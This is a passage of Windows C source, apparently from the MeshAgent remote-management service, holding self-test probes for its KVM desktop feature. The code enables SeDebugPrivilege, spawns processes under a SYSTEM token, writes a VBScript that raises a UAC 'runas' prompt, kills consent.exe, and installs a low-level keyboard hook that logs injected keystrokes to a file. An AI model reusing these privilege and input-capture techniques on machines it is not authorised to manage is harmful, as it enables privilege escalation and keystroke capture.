	WCHAR uacTargetReport[MAX_PATH] = { 0 };
	WCHAR uacScript[MAX_PATH] = { 0 };
	WCHAR tempPath[MAX_PATH] = { 0 };
	WCHAR childArgs[512] = { 0 };
	WCHAR uacArgs[512] = { 0 };
	WCHAR exePath[MAX_PATH * 2] = { 0 };
	WCHAR wscriptPath[MAX_PATH] = { 0 };
	HANDLE systemToken = NULL;
	HANDLE linkedToken = NULL;
	PROCESS_INFORMATION childProcess;
	PROCESS_INFORMATION uacProcess;
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD childSpawnError = ERROR_SUCCESS;
	DWORD uacSpawnError = ERROR_SUCCESS;
	DWORD systemTokenError = ERROR_SUCCESS;
	DWORD linkedTokenError = ERROR_SUCCESS;
	DWORD childExitCode = STILL_ACTIVE;
	DWORD uacExitCode = STILL_ACTIVE;
	DWORD consentKillCount = 0;
	BOOL childSpawned = FALSE;
	BOOL uacSpawned = FALSE;
	BOOL systemTokenReady = FALSE;
	BOOL linkedTokenReady = FALSE;
	BOOL success = FALSE;
	char* childJson = NULL;
	char* uacJson = NULL;
	char* uacTargetJson = NULL;
	char* uacScriptUtf8 = NULL;

	ZeroMemory(&childProcess, sizeof(childProcess));
	ZeroMemory(&uacProcess, sizeof(uacProcess));

	if (ExpandEnvironmentStringsW(L"%PUBLIC%\\Documents\\MeshAgent\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
	{
		GetTempPathW((DWORD)_countof(tempPath), tempPath);
	}
	else
	{
		CreateDirectoryW(tempPath, NULL);
	}
	StringCchPrintfW(childReport, _countof(childReport), L"%lsMeshSecureDesktopProbe_%lu_child.json", tempPath, GetCurrentProcessId());
	StringCchPrintfW(uacReport, _countof(uacReport), L"%lsMeshSecureDesktopProbe_%lu_uac.json", tempPath, GetCurrentProcessId());
	StringCchPrintfW(uacTargetReport, _countof(uacTargetReport), L"%lsMeshSecureDesktopProbe_%lu_uac_target.json", tempPath, GetCurrentProcessId());
	StringCchPrintfW(uacScript, _countof(uacScript), L"%lsMeshSecureDesktopProbe_%lu_uac.vbs", tempPath, GetCurrentProcessId());
	DeleteFileW(childReport);
	DeleteFileW(uacReport);
	DeleteFileW(uacTargetReport);
	DeleteFileW(uacScript);

	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");

	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
	if (systemTokenReady)
	{
		StringCchPrintfW(childArgs, _countof(childArgs), L"-kvm-secure-desktop-probe-child \"%ls\" %u", childReport, 20000);
		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, childArgs, L"winsta0\\default", &childProcess, &childSpawnError);
	}
	if (childSpawned)
	{
		Sleep(1500);
	}
	linkedTokenReady = MeshService_GetLinkedPrimaryToken(sessionId, &linkedToken, &linkedTokenError);
	if (linkedTokenReady)
	{
		if (MeshService_ProcessHasSystemSid())
		{
			GetModuleFileNameW(NULL, exePath, (DWORD)_countof(exePath));
			ExpandEnvironmentStringsW(L"%SystemRoot%\\System32\\wscript.exe", wscriptPath, (DWORD)_countof(wscriptPath));
			uacScriptUtf8 = (char*)malloc(4096);
			if (uacScriptUtf8 != NULL)
			{
				int written = sprintf_s(
					uacScriptUtf8,
					4096,
					"On Error Resume Next\r\n"
					"Set shell = CreateObject(\"Shell.Application\")\r\n"
					"Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n"
					"shell.ShellExecute \"%S\", \"-kvm-uac-consent-target 15000 \"\"%S\"\"\", \"\", \"runas\", 1\r\n"
					"errNum = Err.Number\r\n"
					"Set file = fso.CreateTextFile(\"%S\", True)\r\n"
					"file.Write \"{\"\"errorNumber\"\":\"\r\n"
					"file.Write CStr(errNum)\r\n"
					"file.Write \"}\"\r\n"
					"file.Close\r\n"
					"WScript.Quit errNum\r\n",
					exePath,
					uacTargetReport,
					uacReport);
				if (written > 0 && MeshService_WriteUtf8TextFileW(uacScript, uacScriptUtf8))
				{
					StringCchPrintfW(uacArgs, _countof(uacArgs), L"//B //NoLogo \"%ls\"", uacScript);
					uacSpawned = MeshService_SpawnExecutableWithTokenW(linkedToken, wscriptPath, uacArgs, L"winsta0\\default", &uacProcess, &uacSpawnError);
				}
				else
				{
					uacSpawnError = ERROR_WRITE_FAULT;
				}
			}
			else
			{
				uacSpawnError = ERROR_OUTOFMEMORY;
			}
		}
		else
		{
			StringCchPrintfW(uacArgs, _countof(uacArgs), L"-kvm-uac-consent-trigger \"%ls\" %u", uacReport, 15000);
			uacSpawned = MeshService_SpawnProcessWithTokenW(linkedToken, uacArgs, L"winsta0\\default", &uacProcess, &uacSpawnError);
		}
	}

	if (childSpawned)
	{
		WaitForSingleObject(childProcess.hProcess, 30000);
		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
	}
	MeshService_TerminateProcessesByNameInSessionW(L"consent.exe", sessionId, &consentKillCount);
	if (uacSpawned)
	{
		WaitForSingleObject(uacProcess.hProcess, 10000);
		GetExitCodeProcess(uacProcess.hProcess, &uacExitCode);
	}

	childJson = MeshService_ReadUtf8TextFileW(childReport);
	uacJson = MeshService_ReadUtf8TextFileW(uacReport);
	uacTargetJson = MeshService_ReadUtf8TextFileW(uacTargetReport);
	success = (childSpawned &&
		childExitCode == 0 &&
		childJson != NULL &&
		strstr(childJson, "\"success\":true") != NULL);

	printf("{\"success\":%s,", success ? "true" : "false");
	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
	printf("\"systemTokenReady\":%s,", systemTokenReady ? "true" : "false");
	printf("\"linkedTokenReady\":%s,", linkedTokenReady ? "true" : "false");
	printf("\"childSpawned\":%s,", childSpawned ? "true" : "false");
	printf("\"uacSpawned\":%s,", uacSpawned ? "true" : "false");
	printf("\"systemTokenError\":%lu,", (unsigned long)systemTokenError);
	printf("\"linkedTokenError\":%lu,", (unsigned long)linkedTokenError);
	printf("\"childSpawnError\":%lu,", (unsigned long)childSpawnError);
	printf("\"uacSpawnError\":%lu,", (unsigned long)uacSpawnError);
	printf("\"childExitCode\":%lu,", (unsigned long)childExitCode);
	printf("\"uacExitCode\":%lu,", (unsigned long)uacExitCode);
	printf("\"consentKillCount\":%lu,", (unsigned long)consentKillCount);
	printf("\"probe\":%s,", childJson != NULL ? childJson : "null");
	printf("\"uac\":%s,", uacJson != NULL ? uacJson : "null");
	printf("\"uacTarget\":%s}\n", uacTargetJson != NULL ? uacTargetJson : "null");
	fflush(stdout);

	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
	if (uacProcess.hThread != NULL) { CloseHandle(uacProcess.hThread); }
	if (uacProcess.hProcess != NULL) { CloseHandle(uacProcess.hProcess); }
	if (systemToken != NULL) { CloseHandle(systemToken); }
	if (linkedToken != NULL) { CloseHandle(linkedToken); }
	if (childJson != NULL) { free(childJson); }
	if (uacJson != NULL) { free(uacJson); }
	if (uacTargetJson != NULL) { free(uacTargetJson); }
	if (uacScriptUtf8 != NULL) { free(uacScriptUtf8); }
	DeleteFileW(childReport);
	DeleteFileW(uacReport);
	DeleteFileW(uacTargetReport);
	DeleteFileW(uacScript);
	return success ? 0 : 1;
}

typedef struct MeshServiceFindWindowContext
{
	const WCHAR* title;
	DWORD pid;
	HWND hwnd;
} MeshServiceFindWindowContext;

typedef struct MeshServiceWindowSnapshotContext
{
	DWORD sessionId;
	WCHAR* buffer;
	size_t bufferCount;
	size_t used;
	int entryCount;
} MeshServiceWindowSnapshotContext;

static DWORD MeshService_KvmDesktopAccessMask(void)
{
	return DESKTOP_CREATEMENU |
		DESKTOP_CREATEWINDOW |
		DESKTOP_ENUMERATE |
		DESKTOP_HOOKCONTROL |
		DESKTOP_WRITEOBJECTS |
		DESKTOP_READOBJECTS |
		DESKTOP_SWITCHDESKTOP |
		GENERIC_READ |
		GENERIC_WRITE;
}

static BOOL MeshService_BindCurrentProcessToInteractiveWindowStation(DWORD* errorOut)
{
	HWINSTA windowStation = OpenWindowStationW(L"WinSta0", FALSE, WINSTA_ALL_ACCESS);
	BOOL ok = FALSE;

	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
	if (windowStation == NULL)
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		return FALSE;
	}
	ok = SetProcessWindowStation(windowStation);
	if (!ok && errorOut != NULL) { *errorOut = GetLastError(); }
	CloseWindowStation(windowStation);
	return ok;
}

static BOOL MeshService_GetDesktopNameW(HDESK desktop, WCHAR* name, DWORD nameCount)
{
	if (name != NULL && nameCount > 0) { name[0] = L'\0'; }
	if (desktop == NULL || name == NULL || nameCount == 0) { return FALSE; }
	return GetUserObjectInformationW(desktop, UOI_NAME, name, nameCount * sizeof(WCHAR), NULL) ? TRUE : FALSE;
}

static BOOL MeshService_BindCurrentThreadToNamedDesktop(const WCHAR* desktopName, WCHAR* actualDesktopName, DWORD actualDesktopNameCount, DWORD* errorOut)
{
	HDESK desktop = NULL;
	BOOL ok = FALSE;

	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
	if (actualDesktopName != NULL && actualDesktopNameCount > 0) { actualDesktopName[0] = L'\0'; }
	if (desktopName == NULL || desktopName[0] == L'\0')
	{
		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
		return FALSE;
	}
	desktop = OpenDesktopW(desktopName, 0, FALSE, MeshService_KvmDesktopAccessMask());
	if (desktop == NULL)
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		return FALSE;
	}
	MeshService_GetDesktopNameW(desktop, actualDesktopName, actualDesktopNameCount);
	ok = SetThreadDesktop(desktop);
	if (!ok && errorOut != NULL) { *errorOut = GetLastError(); }
	CloseDesktop(desktop);
	return ok;
}

static BOOL MeshService_BindCurrentThreadToInputDesktop(WCHAR* desktopName, DWORD desktopNameCount, DWORD* errorOut)
{
	HDESK inputDesktop = OpenInputDesktop(0, FALSE, MeshService_KvmDesktopAccessMask());
	BOOL ok = FALSE;

	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
	if (desktopName != NULL && desktopNameCount > 0) { desktopName[0] = L'\0'; }
	if (inputDesktop == NULL)
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		return FALSE;
	}
	MeshService_GetDesktopNameW(inputDesktop, desktopName, desktopNameCount);
	ok = SetThreadDesktop(inputDesktop);
	if (!ok && errorOut != NULL) { *errorOut = GetLastError(); }
	CloseDesktop(inputDesktop);
	return ok;
}

static void MeshService_AppendWindowSnapshotText(MeshServiceWindowSnapshotContext* context, const WCHAR* text)
{
	size_t remaining = 0;
	size_t textLen = 0;

	if (context == NULL || context->buffer == NULL || context->bufferCount == 0 || text == NULL) { return; }
	if (context->used >= (context->bufferCount - 1)) { return; }
	remaining = context->bufferCount - context->used;
	textLen = wcslen(text);
	if (textLen >= remaining) { textLen = remaining - 1; }
	if (textLen == 0) { return; }
	memcpy(context->buffer + context->used, text, textLen * sizeof(WCHAR));
	context->used += textLen;
	context->buffer[context->used] = L'\0';
}

static BOOL CALLBACK MeshService_WindowSnapshotEnumProc(HWND hwnd, LPARAM lParam)
{
	MeshServiceWindowSnapshotContext* context = (MeshServiceWindowSnapshotContext*)lParam;
	WCHAR title[256];
	WCHAR className[64];
	WCHAR entry[384];
	DWORD pid = 0;
	DWORD processSessionId = 0;

	if (context == NULL || context->buffer == NULL || context->entryCount >= 8) { return FALSE; }
	GetWindowThreadProcessId(hwnd, &pid);
	if (pid == 0 || !ProcessIdToSessionId(pid, &processSessionId) || processSessionId != context->sessionId) { return TRUE; }
	ZeroMemory(title, sizeof(title));
	ZeroMemory(className, sizeof(className));
	GetWindowTextW(hwnd, title, (int)_countof(title));
	GetClassNameW(hwnd, className, (int)_countof(className));
	if (title[0] == L'\0' && className[0] == L'\0') { return TRUE; }
	if (SUCCEEDED(StringCchPrintfW(
		entry,
		_countof(entry),
		L"%ls%lu/%lc/%ls/%ls",
		context->entryCount > 0 ? L" | " : L"",
		(unsigned long)pid,
		IsWindowVisible(hwnd) ? L'V' : L'H',
		className,
		title)))
	{
		MeshService_AppendWindowSnapshotText(context, entry);
		++context->entryCount;
	}
	return TRUE;
}

static BOOL MeshService_EnumDesktopWindowsByName(const WCHAR* desktopName, WNDENUMPROC callback, LPARAM lParam)
{
	HDESK desktop = NULL;
	BOOL ok = FALSE;

	if (callback == NULL) { return FALSE; }
	if (desktopName != NULL && desktopName[0] != L'\0')
	{
		desktop = OpenDesktopW(desktopName, 0, FALSE, MeshService_KvmDesktopAccessMask());
		if (desktop != NULL)
		{
			ok = EnumDesktopWindows(desktop, callback, lParam);
			CloseDesktop(desktop);
			return ok;
		}
	}
	return EnumWindows(callback, lParam);
}

static void MeshService_BuildWindowSnapshotForSessionW(DWORD sessionId, const WCHAR* desktopName, WCHAR* buffer, size_t bufferCount)
{
	MeshServiceWindowSnapshotContext context;

	if (buffer == NULL || bufferCount == 0) { return; }
	ZeroMemory(buffer, sizeof(WCHAR) * bufferCount);
	ZeroMemory(&context, sizeof(context));
	context.sessionId = sessionId;
	context.buffer = buffer;
	context.bufferCount = bufferCount;
	MeshService_EnumDesktopWindowsByName(desktopName, MeshService_WindowSnapshotEnumProc, (LPARAM)&context);
	if (context.entryCount == 0)
	{
		StringCchCopyW(buffer, bufferCount, L"none");
	}
}

static BOOL CALLBACK MeshService_FindWindowByTitleEnumProc(HWND hwnd, LPARAM lParam)
{
	MeshServiceFindWindowContext* context = (MeshServiceFindWindowContext*)lParam;
	WCHAR title[256];
	DWORD pid = 0;

	if (context == NULL || context->title == NULL) { return TRUE; }
	GetWindowThreadProcessId(hwnd, &pid);
	if (GetWindowTextW(hwnd, title, (int)_countof(title)) == 0) { return TRUE; }
	if (_wcsicmp(title, context->title) == 0 || wcsstr(title, context->title) != NULL)
	{
		context->hwnd = hwnd;
		return FALSE;
	}
	return TRUE;
}

static BOOL MeshService_WaitForTopLevelWindowByTitleW(const WCHAR* title, const WCHAR* desktopName, DWORD timeoutMs, DWORD* elapsedMsOut, HWND* hwndOut)
{
	MeshServiceFindWindowContext context;
	ULONGLONG started = GetTickCount64();

	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
	if (hwndOut != NULL) { *hwndOut = NULL; }
	if (title == NULL || title[0] == L'\0') { return FALSE; }

	ZeroMemory(&context, sizeof(context));
	context.title = title;
	context.pid = 0;

	while ((GetTickCount64() - started) <= timeoutMs)
	{
		context.hwnd = NULL;
		MeshService_EnumDesktopWindowsByName(desktopName, MeshService_FindWindowByTitleEnumProc, (LPARAM)&context);
		if (context.hwnd != NULL)
		{
			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
			if (hwndOut != NULL) { *hwndOut = context.hwnd; }
			return TRUE;
		}
		Sleep(50);
	}
	return FALSE;
}

static BOOL MeshService_BringWindowToForeground(HWND hwnd)
{
	DWORD currentThreadId = GetCurrentThreadId();
	DWORD targetThreadId = 0;
	DWORD foregroundThreadId = 0;
	HWND foreground = NULL;
	BOOL attachTarget = FALSE;
	BOOL attachForeground = FALSE;
	BOOL ok = FALSE;

	if (hwnd == NULL) { return FALSE; }
	foreground = GetForegroundWindow();
	targetThreadId = GetWindowThreadProcessId(hwnd, NULL);
	foregroundThreadId = (foreground != NULL) ? GetWindowThreadProcessId(foreground, NULL) : 0;

	AllowSetForegroundWindow(ASFW_ANY);
	if (targetThreadId != 0 && targetThreadId != currentThreadId)
	{
		attachTarget = AttachThreadInput(currentThreadId, targetThreadId, TRUE);
	}
	if (foregroundThreadId != 0 && foregroundThreadId != currentThreadId && foregroundThreadId != targetThreadId)
	{
		attachForeground = AttachThreadInput(currentThreadId, foregroundThreadId, TRUE);
	}

	ShowWindow(hwnd, SW_SHOW);
	ShowWindow(hwnd, SW_RESTORE);
	BringWindowToTop(hwnd);
	SetActiveWindow(hwnd);
	SetFocus(hwnd);
	ok = SetForegroundWindow(hwnd);
	if (!ok && GetForegroundWindow() == hwnd) { ok = TRUE; }
	Sleep(150);
	if (!ok && GetForegroundWindow() == hwnd) { ok = TRUE; }

	if (attachForeground) { AttachThreadInput(currentThreadId, foregroundThreadId, FALSE); }
	if (attachTarget) { AttachThreadInput(currentThreadId, targetThreadId, FALSE); }
	return ok || GetForegroundWindow() == hwnd;
}

static BOOL MeshService_KvmSendPacket(const char* packet, int packetLen, ILibKVM_WriteHandler writeHandler, void* reserved)
{
	return (packet != NULL && packetLen > 0 && kvm_relay_feeddata((char*)packet, packetLen, writeHandler, reserved) == packetLen);
}

static BOOL MeshService_KvmSendUnicodeKey(WORD value, int up, ILibKVM_WriteHandler writeHandler, void* reserved)
{
	char packet[7];
	((unsigned short*)packet)[0] = (unsigned short)htons((unsigned short)MNG_KVM_KEY_UNICODE);
	((unsigned short*)packet)[1] = (unsigned short)htons((unsigned short)7);
	packet[4] = (char)up;
	packet[5] = (char)((value >> 8) & 0xFF);
	packet[6] = (char)(value & 0xFF);
	return MeshService_KvmSendPacket(packet, (int)sizeof(packet), writeHandler, reserved);
}

static BOOL MeshService_KvmSendVirtualKey(BYTE vk, int up, ILibKVM_WriteHandler writeHandler, void* reserved)
{
	char packet[6];
	((unsigned short*)packet)[0] = (unsigned short)htons((unsigned short)MNG_KVM_KEY);
	((unsigned short*)packet)[1] = (unsigned short)htons((unsigned short)6);
	packet[4] = (char)up;
	packet[5] = (char)vk;
	return MeshService_KvmSendPacket(packet, (int)sizeof(packet), writeHandler, reserved);
}

static BOOL MeshService_KvmTypeMarkerText(const char* marker, ILibKVM_WriteHandler writeHandler, void* reserved)
{
	size_t i = 0;

	if (marker == NULL || marker[0] == '\0') { return FALSE; }
	for (i = 0; marker[i] != '\0'; ++i)
	{
		WORD codeUnit = (WORD)(unsigned char)marker[i];
		if (!MeshService_KvmSendUnicodeKey(codeUnit, 0, writeHandler, reserved)) { return FALSE; }
		Sleep(15);
		if (!MeshService_KvmSendUnicodeKey(codeUnit, 1, writeHandler, reserved)) { return FALSE; }
		Sleep(15);
	}
	if (!MeshService_KvmSendVirtualKey(VK_RETURN, 0, writeHandler, reserved)) { return FALSE; }
	Sleep(15);
	if (!MeshService_KvmSendVirtualKey(VK_RETURN, 1, writeHandler, reserved)) { return FALSE; }
	return TRUE;
}

static BOOL MeshService_KvmTypeMarkerVirtualText(const char* marker, ILibKVM_WriteHandler writeHandler, void* reserved)
{
	size_t i = 0;
	BYTE vk = 0;

	if (marker == NULL || marker[0] == '\0') { return FALSE; }
	for (i = 0; marker[i] != '\0'; ++i)
	{
		if (marker[i] >= 'a' && marker[i] <= 'z')
		{
			vk = (BYTE)('A' + (marker[i] - 'a'));
		}
		else if (marker[i] >= 'A' && marker[i] <= 'Z')
		{
			vk = (BYTE)marker[i];
		}
		else if (marker[i] >= '0' && marker[i] <= '9')
		{
			vk = (BYTE)marker[i];
		}
		else
		{
			return FALSE;
		}

		if (!MeshService_KvmSendVirtualKey(vk, 0, writeHandler, reserved)) { return FALSE; }
		Sleep(15);
		if (!MeshService_KvmSendVirtualKey(vk, 1, writeHandler, reserved)) { return FALSE; }
		Sleep(15);
	}
	if (!MeshService_KvmSendVirtualKey(VK_RETURN, 0, writeHandler, reserved)) { return FALSE; }
	Sleep(15);
	if (!MeshService_KvmSendVirtualKey(VK_RETURN, 1, writeHandler, reserved)) { return FALSE; }
	return TRUE;
}

static void MeshService_TrimLineEndingsA(char* text)
{
	size_t len = 0;
	if (text == NULL) { return; }
	len = strlen(text);
	while (len > 0 && (text[len - 1] == '\r' || text[len - 1] == '\n' || text[len - 1] == ' ' || text[len - 1] == '\t'))
	{
		text[--len] = '\0';
	}
}

static BOOL MeshService_TryParseWindowHandleTextA(const char* text, HWND* hwndOut)
{
	char* endPtr = NULL;
	unsigned long long rawValue = 0;

	if (hwndOut != NULL) { *hwndOut = NULL; }
	if (text == NULL || hwndOut == NULL) { return FALSE; }

	while (*text == ' ' || *text == '\t') { ++text; }
	if (*text == '\0') { return FALSE; }

	rawValue = _strtoui64(text, &endPtr, 10);
	if (endPtr == text) { return FALSE; }
	while (*endPtr == ' ' || *endPtr == '\t') { ++endPtr; }
	if (*endPtr != '\0') { return FALSE; }

	*hwndOut = (HWND)(ULONG_PTR)rawValue;
	return (*hwndOut != NULL);
}

static BOOL MeshService_WaitForReportedWindowHandleW(const WCHAR* reportPath, DWORD expectedPid, DWORD timeoutMs, DWORD* elapsedMsOut, HWND* hwndOut)
{
	ULONGLONG started = GetTickCount64();

	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
	if (hwndOut != NULL) { *hwndOut = NULL; }
	if (reportPath == NULL || reportPath[0] == L'\0') { return FALSE; }

	while ((GetTickCount64() - started) <= timeoutMs)
	{
		char* rawText = MeshService_ReadUtf8TextFileW(reportPath);
		if (rawText != NULL)
		{
			HWND hwnd = NULL;

			MeshService_TrimLineEndingsA(rawText);
			if (MeshService_TryParseWindowHandleTextA(rawText, &hwnd) && IsWindow(hwnd))
			{
				DWORD actualPid = 0;
				GetWindowThreadProcessId(hwnd, &actualPid);
				if (expectedPid == 0 || actualPid == expectedPid)
				{
					if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
					if (hwndOut != NULL) { *hwndOut = hwnd; }
					free(rawText);
					return TRUE;
				}
			}
			free(rawText);
		}
		Sleep(50);
	}
	return FALSE;
}

static BOOL MeshService_WaitForFilePresenceW(const WCHAR* path, DWORD timeoutMs, DWORD* elapsedMsOut)
{
	ULONGLONG started = GetTickCount64();

	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
	if (path == NULL || path[0] == L'\0') { return FALSE; }

	while ((GetTickCount64() - started) <= timeoutMs)
	{
		DWORD attributes = GetFileAttributesW(path);
		if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
		{
			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
			return TRUE;
		}
		Sleep(50);
	}
	return FALSE;
}

static BOOL MeshService_WriteWideTextFileUtf8W(const WCHAR* path, const WCHAR* text)
{
	int needed = 0;
	char* utf8 = NULL;
	BOOL ok = FALSE;

	if (path == NULL || path[0] == L'\0' || text == NULL) { return FALSE; }
	needed = WideCharToMultiByte(CP_UTF8, 0, text, -1, NULL, 0, NULL, NULL);
	if (needed <= 0) { return FALSE; }
	utf8 = (char*)malloc((size_t)needed);
	if (utf8 == NULL) { return FALSE; }
	if (WideCharToMultiByte(CP_UTF8, 0, text, -1, utf8, needed, NULL, NULL) > 0)
	{
		ok = MeshService_WriteUtf8TextFileW(path, utf8);
	}
	free(utf8);
	return ok;
}

static BOOL MeshService_JsonFieldTrueA(const char* json, const char* fieldName)
{
	char needle[128];

	if (json == NULL || fieldName == NULL || fieldName[0] == '\0') { return FALSE; }
	if (FAILED(StringCchPrintfA(needle, _countof(needle), "\"%s\":true", fieldName))) { return FALSE; }
	return (strstr(json, needle) != NULL);
}

static int MeshService_RunKvmElevatedInputTargetCommand(const WCHAR* hwndReportPath, const WCHAR* readyReportPath, const WCHAR* capturePath, const WCHAR* title)
{
	HANDLE consoleInput = INVALID_HANDLE_VALUE;
	HWND consoleWindow = NULL;
	WCHAR inputBuffer[256];
	WCHAR hwndBuffer[64];
	DWORD charsRead = 0;
	BOOL success = FALSE;
	BOOL consoleReady = FALSE;

	ZeroMemory(inputBuffer, sizeof(inputBuffer));
	ZeroMemory(hwndBuffer, sizeof(hwndBuffer));

	if (AttachConsole(ATTACH_PARENT_PROCESS) || GetLastError() == ERROR_ACCESS_DENIED)
	{
		consoleReady = TRUE;
	}
	else if (AllocConsole() || GetLastError() == ERROR_ACCESS_DENIED)
	{
		consoleReady = TRUE;
	}
	if (!consoleReady)
	{
		return 1;
	}
	if (title != NULL && title[0] != L'\0')
	{
		SetConsoleTitleW(title);
		Sleep(150);
	}
	consoleWindow = GetConsoleWindow();
	if (hwndReportPath != NULL && hwndReportPath[0] != L'\0')
	{
		StringCchPrintfW(hwndBuffer, _countof(hwndBuffer), L"%llu", (unsigned long long)(ULONG_PTR)consoleWindow);
		MeshService_WriteWideTextFileUtf8W(hwndReportPath, hwndBuffer);
	}

	consoleInput = CreateFileW(L"CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (consoleInput == INVALID_HANDLE_VALUE)
	{
		return 1;
	}
	FlushConsoleInputBuffer(consoleInput);
	if (readyReportPath != NULL && readyReportPath[0] != L'\0')
	{
		MeshService_WriteWideTextFileUtf8W(readyReportPath, L"READY");
	}
	if (ReadConsoleW(consoleInput, inputBuffer, (DWORD)(_countof(inputBuffer) - 1), &charsRead, NULL) && charsRead > 0)
	{
		inputBuffer[charsRead] = L'\0';
		while (charsRead > 0 && (inputBuffer[charsRead - 1] == L'\r' || inputBuffer[charsRead - 1] == L'\n'))
		{
			inputBuffer[--charsRead] = L'\0';
		}
		success = MeshService_WriteWideTextFileUtf8W(capturePath, inputBuffer);
	}
	CloseHandle(consoleInput);
	return success ? 0 : 1;
}

typedef struct MeshServiceBlockInputTargetState
{
	WCHAR hwndReportPath[MAX_PATH];
	WCHAR readyReportPath[MAX_PATH];
	WCHAR capturePath[MAX_PATH];
	HHOOK keyboardHook;
	UINT_PTR timeoutTimer;
	char captureBuffer[256];
	size_t captureLength;
	BOOL captureWritten;
} MeshServiceBlockInputTargetState;

static MeshServiceBlockInputTargetState gMeshServiceBlockInputTargetState;

static void MeshService_BlockInputTargetAppendVk(DWORD vkCode)
{
	char value = '\0';

	if (gMeshServiceBlockInputTargetState.captureLength >= (_countof(gMeshServiceBlockInputTargetState.captureBuffer) - 1)) { return; }
	if (vkCode >= 'A' && vkCode <= 'Z')
	{
		value = (char)('a' + (char)(vkCode - 'A'));
	}
	else if (vkCode >= '0' && vkCode <= '9')
	{
		value = (char)vkCode;
	}
	if (value == '\0') { return; }

	gMeshServiceBlockInputTargetState.captureBuffer[gMeshServiceBlockInputTargetState.captureLength++] = value;
	gMeshServiceBlockInputTargetState.captureBuffer[gMeshServiceBlockInputTargetState.captureLength] = '\0';
}

static LRESULT CALLBACK MeshService_BlockInputTargetKeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;

		if (keyInfo != NULL && (keyInfo->flags & LLKHF_INJECTED) != 0)
		{
			if (keyInfo->vkCode == VK_RETURN)
			{
				gMeshServiceBlockInputTargetState.captureWritten = MeshService_WriteUtf8TextFileW(
					gMeshServiceBlockInputTargetState.capturePath,
					gMeshServiceBlockInputTargetState.captureBuffer);
				PostQuitMessage(0);
			}
			else
			{
				MeshService_BlockInputTargetAppendVk(keyInfo->vkCode);
			}
		}
	}
	return CallNextHookEx(gMeshServiceBlockInputTargetState.keyboardHook, code, wParam, lParam);
}

static int MeshService_RunKvmBlockInputTargetCommand(const WCHAR* hwndReportPath, const WCHAR* readyReportPath, const WCHAR* capturePath, const WCHAR* title)
{
	MSG message;
	int result = 1;
	UNREFERENCED_PARAMETER(title);

	ZeroMemory(&gMeshServiceBlockInputTargetState, sizeof(gMeshServiceBlockInputTargetState));
	if (hwndReportPath != NULL) { StringCchCopyW(gMeshServiceBlockInputTargetState.hwndReportPath, _countof(gMeshServiceBlockInputTargetState.hwndReportPath), hwndReportPath); }
	if (readyReportPath != NULL) { StringCchCopyW(gMeshServiceBlockInputTargetState.readyReportPath, _countof(gMeshServiceBlockInputTargetState.readyReportPath), readyReportPath); }
	if (capturePath != NULL) { StringCchCopyW(gMeshServiceBlockInputTargetState.capturePath, _countof(gMeshServiceBlockInputTargetState.capturePath), capturePath); }

	PeekMessageW(&message, NULL, WM_USER, WM_USER, PM_NOREMOVE);
	gMeshServiceBlockInputTargetState.keyboardHook = SetWindowsHookExW(
		WH_KEYBOARD_LL,
		MeshService_BlockInputTargetKeyboardProc,
		GetModuleHandleW(NULL),
		0);
	if (gMeshServiceBlockInputTargetState.keyboardHook == NULL)
	{
		return 1;
	}

	if (gMeshServiceBlockInputTargetState.hwndReportPath[0] != L'\0')
	{
		MeshService_WriteWideTextFileUtf8W(gMeshServiceBlockInputTargetState.hwndReportPath, L"0");
	}
	if (gMeshServiceBlockInputTargetState.readyReportPath[0] != L'\0')
	{
		MeshService_WriteWideTextFileUtf8W(gMeshServiceBlockInputTargetState.readyReportPath, L"READY");
	}
	gMeshServiceBlockInputTargetState.timeoutTimer = SetTimer(NULL, 1, 60000, NULL);

	while (GetMessageW(&message, NULL, 0, 0) > 0)
	{
		if (message.message == WM_TIMER && message.wParam == gMeshServiceBlockInputTargetState.timeoutTimer)
		{
			PostQuitMessage(0);
			continue;
		}
		TranslateMessage(&message);
		DispatchMessageW(&message);
	}

	result = gMeshServiceBlockInputTargetState.captureWritten ? 0 : 1;
	if (gMeshServiceBlockInputTargetState.timeoutTimer != 0)
	{
		KillTimer(NULL, gMeshServiceBlockInputTargetState.timeoutTimer);
	}
	if (gMeshServiceBlockInputTargetState.keyboardHook != NULL)
	{
		UnhookWindowsHookEx(gMeshServiceBlockInputTargetState.keyboardHook);
	}
	return result;
}

static int MeshService_RunKvmElevatedInputProbeWorkerCommand(void)
{
	MeshServiceKvmSessionChangeProbeState state;
	char exePath[MAX_PATH * 4] = { 0 };
	char marker[64] = { 0 };
	char* capturedText = NULL;
	void* chain = NULL;
	void* pipeManager = NULL;
	HANDLE chainThread = NULL;
	HANDLE elevatedToken = NULL;
	PROCESS_INFORMATION targetProcess;
	WCHAR tempPath[MAX_PATH] = { 0 };
